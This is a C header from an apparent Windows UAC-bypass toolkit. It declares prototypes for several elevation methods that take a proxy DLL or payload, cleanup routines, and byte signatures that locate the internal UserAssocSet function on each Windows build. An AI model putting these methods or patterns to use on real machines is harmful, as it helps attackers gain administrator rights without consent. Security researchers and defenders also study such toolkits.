/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2020
*
*  TITLE:       HYBRIDS.H
*
*  VERSION:     3.52
*
*  DATE:        28 Oct 2020
*
*  Prototypes and definitions for hybrid methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

#define TEXT_SECTION ".text"
#define TEXT_SECTION_LEGNTH sizeof(TEXT_SECTION)

typedef HRESULT(WINAPI* pfnUserAssocSet)(
    ULONG set,
    LPCWSTR pszExt, 
    LPCWSTR pszSet);

typedef HRESULT(WINAPI* pfnUserAssocSet2)(
    ULONG set,
    LPCWSTR pszExt,
    LPCWSTR pszSet,
    ULONG dwFlags);

typedef struct _USER_ASSOC_PTR {
    union {
        pfnUserAssocSet UserAssocSet;
        pfnUserAssocSet2 UserAssocSet2; //Win10 2004
    } DUMMYUNIONNAME;
} USER_ASSOC_PTR, * PUSER_ASSOC_PTR;

//
// UserAssocSet patterns.
//

// mov r8, [rbx + 40h]
// mov rdx, [rbx + 38h]
// mov ecx, 1
// call UserAssocSet
static BYTE UserAssocSet_7601[] = {
    0x4C, 0x8B, 0x43, 0x40, 0x48, 0x8B, 0x53, 0x38, 0xB9, 0x01, 0x00, 0x00, 0x00
};

// mov r8, r15
// mov rdx, r14
// mov ecx, 2
// call UserAssocSet
static BYTE UserAssocSet_9600[] = {
    0x4D, 0x8B, 0xC7, 0x49, 0x8B, 0xD6, 0xB9, 0x02, 0x00, 0x00, 0x00
};

// mov rdx, [rsi]
// mov r8, rbx
// mov ecx, 2
// call UserAssocSet
static BYTE UserAssocSet_14393[] = {
    0x48, 0x8B, 0x16, 0x4C, 0x8B, 0xC3, 0xB9, 0x02, 0x00, 0x00, 0x00
};

// mov r8, rsi
// mov r9d, ecx
// mov rdx, r15
// call UserAssocSet
static BYTE UserAssocSet_17763[] = {
    0x4C, 0x8B, 0xC6, 0x44, 0x8B, 0xC9, 0x49, 0x8B, 0xD7
};

// mov r9d, ecx
// mov r8, rsi
// mov rdx, r15
// call UserAssocSet
static BYTE UserAssocSet_18362_18363[] = {
    0x44, 0x8B, 0xC9, 0x4C, 0x8B, 0xC6, 0x49, 0x8B, 0xD7
};

//
// In Windows 10 2004 and above it is different.
//

// mov r9d, ecx
// mov r8, rsi
// mov rdx, r15
// call UserAssocSet
static BYTE UserAssocSet_19041_v2[] = {
    0x44, 0x8B, 0xC9, 0x4C, 0x8B, 0xC6, 0x49, 0x8B, 0xD7
};

// mov r8, rdi
// mov rdx, rsi
// mov ecx, r9d
// call UserAssocSet
static BYTE UserAssocSet_19042[] = {
    0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xD6, 0x41, 0x8B, 0xC9
};

// call UserAssocSet
// mov esi, 80000000h
// mov edi, 80070005h
static BYTE UserAssocSet_19041_19042_v1[] = {
    0xBE, 0x00, 0x00, 0x00, 0x80, 0xBF, 0x05, 0x00, 0x07, 0x80
};

//
// End of UserAssocSet patterns.
//

NTSTATUS ucmSXSMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize,
    _In_opt_ LPWSTR lpTargetDirectory,
    _In_ LPWSTR lpTargetApplication,
    _In_opt_ LPWSTR lpLaunchApplication,
    _In_ BOOL bConsentItself);

NTSTATUS ucmDismMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize);

NTSTATUS ucmWow64LoggerMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize);

NTSTATUS ucmUiAccessMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize);

NTSTATUS ucmJunctionMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize);

NTSTATUS ucmSXSDccwMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize);

NTSTATUS ucmCorProfilerMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize);

NTSTATUS ucmDccwCOMMethod(
    _In_ LPWSTR lpszPayload);

NTSTATUS ucmNICPoisonMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize);

NTSTATUS ucmIeAddOnInstallMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize);

NTSTATUS ucmWscActionProtocolMethod(
    _In_ LPWSTR lpszPayload);

//
// Post execution cleanup routines.
//
BOOL ucmMethodCleanupSingleItemSystem32(
    LPWSTR lpItemName);

BOOL ucmJunctionMethodCleanup(
    VOID);

BOOL ucmSXSDccwMethodCleanup(
    VOID);

BOOL ucmSXSMethodCleanup(
    VOID);

